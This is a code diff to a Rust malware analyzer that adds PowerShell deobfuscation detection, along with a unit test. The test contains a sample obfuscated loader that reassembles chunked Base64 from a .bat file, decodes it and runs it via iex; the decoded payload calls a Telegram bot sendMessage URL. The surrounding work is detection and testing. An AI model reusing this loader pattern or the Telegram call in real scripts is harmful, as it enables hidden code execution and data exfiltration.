@@ -3858,6 +3858,14 @@ fn analyze_inner(input: &[u8], cfg: &Config, file_path: Option<std::path::PathBu
         profile_mark!("summarize_binary_noise");
         out = summarize_nul_padding_lines(&out, &mut env);
         profile_mark!("summarize_nul_padding");
+        let out_lower = out.to_ascii_lowercase();
+        if out_lower.contains("frombase64string")
+            && (out_lower.contains("test-path")
+                || out_lower.contains("get-content")
+                || out_lower.contains("gc "))
+        {
+            ps1_scan::scan_inline_powershell_text(&out, &mut env);
+        }
         let raw_text = String::from_utf8_lossy(input);
         let raw_text_for_embedded = {
             let mut scratch = env.clone();
@@ -14384,6 +14392,7 @@ mod synth_more_tests {
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod ps1_obfuscation_tests {
+    use crate::env::{Environment, FsEntry};
     use crate::traits::Trait;
     use crate::{analyze, Config};
 
@@ -15434,6 +15443,70 @@ iex $stage
             "marker chunk Unicode Base64 payload did not emit Telegram URL: {:?}\n{}",
             report.traits,
             report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_marker_base64_loader_recurses_into_download_trait() {
+        use base64::Engine;
+        use std::sync::Arc;
+
+        let decoded =
+            "Invoke-RestMethod -Uri 'https://api.telegram.org/bot987:ghi/sendMessage?chat_id=777'";
+        let mut utf16 = Vec::new();
+        for unit in decoded.encode_utf16() {
+            utf16.extend_from_slice(&unit.to_le_bytes());
+        }
+        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
+        let noisy = format!(
+            "{}waikikibondibeach{}npd{}",
+            &b64[..32],
+            &b64[32..96],
+            &b64[96..]
+        );
+        let chunk_len = noisy.len().div_ceil(5);
+        let chunks: Vec<&str> = noisy
+            .as_bytes()
+            .chunks(chunk_len)
+            .map(|chunk| std::str::from_utf8(chunk).unwrap())
+            .collect();
+
+        let mut env = Environment::new(&Config::default());
+        env.input_bytes = Some(Arc::from(decoded.as_bytes().to_vec()));
+        env.modified_filesystem.insert(
+            r#"c:\users\jsmith\aoc.bat"#.to_string(),
+            FsEntry::Content {
+                content: format!(
+                    ":::1{}\r\n:::2{}\r\n:::3{}\r\n:::4{}\r\n:::5{}\r\n",
+                    chunks.first().copied().unwrap_or(""),
+                    chunks.get(1).copied().unwrap_or(""),
+                    chunks.get(2).copied().unwrap_or(""),
+                    chunks.get(3).copied().unwrap_or(""),
+                    chunks.get(4).copied().unwrap_or("")
+                )
+                .into_bytes(),
+                append: false,
+            },
+        );
+        env.all_extracted_ps1.push(
+            br#"$banana="$env:USERPROFILE\aoc.bat";if(Test-Path $banana){$rawLines=gc $banana|?{$_ -like ":::*"};$part1=($rawLines|?{$_ -like ":::1*"}|%{$_.Substring(4)});$part2=($rawLines|?{$_ -like ":::2*"}|%{$_.Substring(4)});$part3=($rawLines|?{$_ -like ":::3*"}|%{$_.Substring(4)});$part4=($rawLines|?{$_ -like ":::4*"}|%{$_.Substring(4)});$part5=($rawLines|?{$_ -like ":::5*"}|%{$_.Substring(4)});$kiwi=$part1+$part2+$part3+$part4+$part5;$apple=($kiwi-replace"waikikibondibeach",""-replace"npd","");if($apple){try{iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($apple)))}catch{}}}"#
+                .to_vec(),
+        );
+
+        crate::ps1_scan::extract_self_embedded_ps1(
+            &mut env,
+            r#"$banana="$env:USERPROFILE\aoc.bat";if(Test-Path $banana){$rawLines=gc $banana|?{$_ -like ":::*"};$part1=($rawLines|?{$_ -like ":::1*"}|%{$_.Substring(4)});$part2=($rawLines|?{$_ -like ":::2*"}|%{$_.Substring(4)});$part3=($rawLines|?{$_ -like ":::3*"}|%{$_.Substring(4)});$part4=($rawLines|?{$_ -like ":::4*"}|%{$_.Substring(4)});$part5=($rawLines|?{$_ -like ":::5*"}|%{$_.Substring(4)});$kiwi=$part1+$part2+$part3+$part4+$part5;$apple=($kiwi-replace"waikikibondibeach",""-replace"npd","");if($apple){try{iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($apple)))}catch{}}}"#,
+        );
+        crate::ps1_scan::scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src.contains("api.telegram.org/bot987:ghi/sendMessage?chat_id=777")
+            )),
+            "file-backed marker Base64 payload did not emit Telegram URL: {:?}",
+            env.traits
         );
     }
 
